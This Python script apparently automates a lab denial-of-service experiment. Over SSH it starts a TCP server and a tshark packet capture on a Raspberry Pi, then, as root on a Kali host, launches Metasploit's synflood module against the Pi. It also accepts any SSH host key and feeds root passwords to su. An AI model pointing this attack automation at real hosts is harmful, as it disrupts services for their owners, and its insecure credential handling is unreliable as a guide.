import os
import time

import paramiko
import configparser


config = configparser.ConfigParser()
config.read('DOSHelperConfig.ini')


HOME = "/home"

KALI_IP = config["kali"]["IP"]
KALI_USERNAME = config["kali"]["USERNAME"]
KALI_PASSWORD = config["kali"]["PASSWORD"]
KALI_ROOT_PASSWORD = config["kali"]["ROOT_PASSWORD"]

PI_IP = config["pi"]["IP"]
PI_USERNAME = config["pi"]["USERNAME"]
PI_PASSWORD = config["pi"]["PASSWORD"]
PI_ROOT_PASSWORD = config["pi"]["ROOT_PASSWORD"]

SERVER_PORT = "10000"

MEM_FREE_FILE = "mem_free.txt"
CAPTURE_FILE = "capture.txt"
SERVER_FILE = "FancyTCPServer.py"
FIG_NAME = "gg.png"

SYNFLOOD_CMD = f"msfconsole -x 'use auxiliary/dos/tcp/synflood; set RHOSTS {PI_IP}; set RPORT {SERVER_PORT}; run' &"
CAPTURE_CMD = f"tshark -i wlan0 -f tcp > {CAPTURE_FILE}"
SERVER_CMD = f"python3 {SERVER_FILE} </dev/null >/dev/null"
KILL_ATTACK_CMD = "killall ruby"
KILL_CAPTURE_CMD = "killall tshark"
KILL_SERVER_CMD = "killall python3"


def ssh_to_pi():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(PI_IP, username=PI_USERNAME, password=PI_PASSWORD)
    return ssh


def ssh_to_kali():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(KALI_IP, username=KALI_USERNAME, password=KALI_PASSWORD)
    return ssh


def start_pi_server():
    ssh = ssh_to_pi()
    sftp = ssh.open_sftp()
    sftp.put(os.path.join(os.getcwd(), SERVER_FILE), os.path.join(HOME, PI_USERNAME, SERVER_FILE))
    sftp.close()
    ssh.exec_command(SERVER_CMD)
    time.sleep(0.5)
    ssh.close()


def kill_pi_server():
    ssh = ssh_to_pi()
    ssh.exec_command(KILL_SERVER_CMD)
    ssh.close()


def start_attack(attack_cmd):
    ssh = ssh_to_kali()
    ssh_stdin, _, _ = ssh.exec_command('su')
    time.sleep(0.1)  # some environment maybe need this.
    ssh_stdin.write(f"{KALI_ROOT_PASSWORD}\n")
    ssh_stdin.write(f"{attack_cmd}\n")
    time.sleep(7)  # allow synflood start
    ssh.close()


def start_synflood():
    start_attack(SYNFLOOD_CMD)


def kill_attack():
    ssh = ssh_to_kali()
    ssh_stdin, _, _ = ssh.exec_command('su')
    time.sleep(0.1)  # some environment maybe need this.
    ssh_stdin.write(f"{KALI_ROOT_PASSWORD}\n")
    ssh_stdin.write(f"{KILL_ATTACK_CMD}\n")
    ssh.close()


def start_pi_packet_capture(cmd=CAPTURE_CMD):
    ssh = ssh_to_pi()
    ssh_stdin, _, _ = ssh.exec_command('su')
    time.sleep(0.1)  # some environment maybe need this.
    ssh_stdin.write(f"{PI_ROOT_PASSWORD}\n")
    ssh_stdin.write(f"{cmd}\n")
    time.sleep(0.5)
    ssh.close()


def kill_pi_packet_capture():
    ssh = ssh_to_pi()
    ssh_stdin, _, _ = ssh.exec_command('su')
    time.sleep(0.1)  # some environment maybe need this.
    ssh_stdin.write(f"{PI_ROOT_PASSWORD}\n")
    ssh_stdin.write(f"{KILL_CAPTURE_CMD}\n")
    sftp = ssh.open_sftp()
    sftp.get(os.path.join(HOME, PI_USERNAME, CAPTURE_FILE), os.path.join(os.getcwd(), CAPTURE_FILE))
    sftp.close()
    ssh.close()
